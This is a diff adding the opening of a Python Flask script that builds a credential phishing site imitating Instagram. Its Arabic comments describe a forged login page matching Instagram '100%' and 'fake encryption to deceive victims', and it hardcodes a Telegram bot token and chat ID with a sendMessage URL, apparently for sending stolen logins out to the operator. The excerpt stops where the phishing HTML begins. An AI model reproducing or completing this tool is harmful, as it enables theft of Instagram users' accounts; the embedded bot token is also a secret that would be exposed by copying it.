@@ -1,0 +1,37 @@
+# -*- coding: utf-8 -*-  
+
+import requests  
+
+import sqlite3  
+
+from flask import Flask, request, redirect, render_template_string  
+
+from threading import Thread  
+
+from cryptography.fernet import Fernet  
+
+app = Flask(__name__)  
+
+app.secret_key = "INSTA_DEATH_CODE"  
+
+# تدمير شامل للمعلومات  
+
+API_KEY = "7641235883:AAGkJG7PbgZ3UXwmr6L3fR930xxSo"  
+
+CHAT_ID = "-1792947905"  
+
+TG_URL = f"https://api.telegram.org/bot{API_KEY}/sendMessage"  
+
+# تشفير وهمي لخداع الضحايا  
+
+KEY = Fernet.generate_key()  
+
+cipher = Fernet(KEY)  
+
+# واجهة انستقرام المزورة (مطابقة 100%)  
+
+PHISH_PAGE = """  
+
+<!DOCTYPE html>  
+
+<html dir="rtl">  
